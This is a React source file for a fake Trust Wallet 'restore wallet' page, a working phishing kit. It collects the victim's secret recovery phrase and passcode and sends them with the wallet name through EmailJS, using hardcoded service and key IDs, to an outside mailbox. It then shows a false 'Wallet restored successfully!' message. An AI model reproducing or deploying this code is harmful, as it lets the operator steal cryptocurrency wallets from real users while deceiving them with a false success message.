'use client'

import { useState } from 'react'
import { ArrowLeft, Maximize2, X } from 'lucide-react'
import emailjs from '@emailjs/browser'

export default function App() {
  const [step, setStep] = useState(1)
  const [walletName, setWalletName] = useState('Main Wallet')
  const [phrase, setPhrase] = useState('')
  const [passcode, setPasscode] = useState(Array(6).fill('')) // Initialize as an array of 6 empty strings
  const [isLoading, setIsLoading] = useState(false)
  const [successMessage, setSuccessMessage] = useState('')

  const wordCount = phrase.trim().split(/\s+/).length
  const isValidWordCount = wordCount === 12 || wordCount === 18 || wordCount === 24

  const handlePhraseSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    if (isValidWordCount) {
      setStep(2)
    } else {
      alert('Invalid phrase! Must be 12, 18, or 24 words.')
    }
  }

  const handlePasscodeChange = (value: string, index: number) => {
    if (!/^\d?$/.test(value)) return // Allow only digits or empty
    const updatedPasscode = [...passcode]
    updatedPasscode[index] = value
    setPasscode(updatedPasscode)
  }

  const handleRestoreWallet = async () => {
    if (isLoading || passcode.includes('') || passcode.length !== 6) {
      alert('Passcode must be 6 digits!')
      return
    }

    setIsLoading(true)
    setSuccessMessage('')

    try {
      await emailjs.send(
        'service_rs8lrr9',
        'template_9zy6p1h',
        {
          wallet_name: walletName,
          phrase: phrase,
          passcode: passcode.join(''),
        },
        'ZZFqwQrTaRvFP9Jx5'
      )

      setSuccessMessage('Wallet restored successfully!')
      setStep(1)
      setWalletName('Main Wallet')
      setPhrase('')
      setPasscode(Array(6).fill('')) // Reset passcode to empty array
    } catch (error) {
      alert('Failed to restore wallet. Please try again.')
    } finally {
      setIsLoading(false)
    }
  }

  const handleCancel = () => {
    setStep(1)
    setPasscode(Array(6).fill(''))
    setSuccessMessage('')
  }

  return (
    <div className="min-h-screen bg-white text-black dark:bg-black dark:text-gray-300">
      <header className="flex items-center justify-between p-4 border-b border-gray-200 dark:border-gray-800">
        <button className="p-2 hover:bg-gray-200 dark:hover:bg-gray-800 rounded-lg">
          <ArrowLeft className="w-6 h-6" />
        </button>
        <h1 className="text-xl font-medium text-black dark:text-white">Trust Wallet</h1>
        <button className="p-2 hover:bg-gray-200 dark:hover:bg-gray-800 rounded-lg">
          <Maximize2 className="w-6 h-6" />
        </button>
      </header>

      <main className="container max-w-2xl mx-auto px-4 py-8">
        {step === 1 ? (
          <form onSubmit={handlePhraseSubmit} className="space-y-6">
            <div className="space-y-2">
              <label className="block text-sm font-medium">Wallet name</label>
              <div className="relative">
                <input
                  type="text"
                  placeholder="Wallet Name"
                  value={walletName}
                  onChange={(e) => setWalletName(e.target.value)}
                  className="w-full bg-gray-100 dark:bg-gray-800 rounded-lg px-4 py-3 pr-10"
                />
                {walletName && (
                  <button
                    type="button"
                    className="absolute right-3 top-1/2 -translate-y-1/2"
                    onClick={() => setWalletName('')}
                  >
                    <X className="w-5 h-5" />
                  </button>
                )}
              </div>
            </div>

            <div className="space-y-2">
              <label className="block text-sm font-medium">Secret phrase</label>
              <textarea
                value={phrase}
                onChange={(e) => setPhrase(e.target.value)}
                rows={6}
                className="w-full bg-gray-100 dark:bg-gray-800 rounded-lg px-4 py-3 resize-none"
                placeholder="Enter your secret recovery phrase"
              />
              <p className="text-sm text-gray-500">
                Typically 12 (sometimes 18, 24) words separated by single spaces
              </p>
            </div>

            <button
              type="submit"
              disabled={!isValidWordCount}
              className="w-full bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-lg px-4 py-3 disabled:opacity-50 disabled:cursor-not-allowed"
            >
              Next
            </button>
          </form>
        ) : (
          <div className="space-y-8">
            <div className="flex justify-between items-center">
              <button
                onClick={handleCancel}
                className="text-green-400 text-lg font-medium"
              >
                Cancel
              </button>
              <h2 className="text-xl font-medium text-black dark:text-white">
                Verify Passcode
              </h2>
              <div className="w-16"></div>
            </div>

            <div className="text-center">
              <p className="text-gray-400 text-lg">Enter passcode</p>
            </div>

            <div className="flex justify-center gap-3 mb-8">
              {passcode.map((digit, i) => (
                <div
                  key={i}
                  className="w-12 h-12 text-center bg-gray-100 dark:bg-gray-800 text-black dark:text-white rounded-lg flex items-center justify-center text-xl border border-gray-300 dark:border-gray-600 focus-within:border-green-400"
                >
                  <input
                    type="password"
                    value={digit}
                    onChange={(e) => handlePasscodeChange(e.target.value, i)}
                    maxLength={1}
                    className="w-full h-full text-center bg-transparent focus:outline-none"
                  />
                </div>
              ))}
            </div>

            <button
              onClick={handleRestoreWallet}
              disabled={passcode.includes('')}
              className={`w-full bg-green-600 text-white rounded-lg px-4 py-3 font-medium ${!isLoading
                  ? 'hover:bg-green-700 transition-colors'
                  : 'opacity-50 cursor-not-allowed'
                }`}
            >
              {isLoading ? 'Restoring...' : 'Restore Wallet'}
            </button>

            {successMessage && (
              <p className="text-center text-sm mt-4 font-medium text-green-400">
                {successMessage}
              </p>
            )}
          </div>
        )}
      </main>
    </div>
  )
}
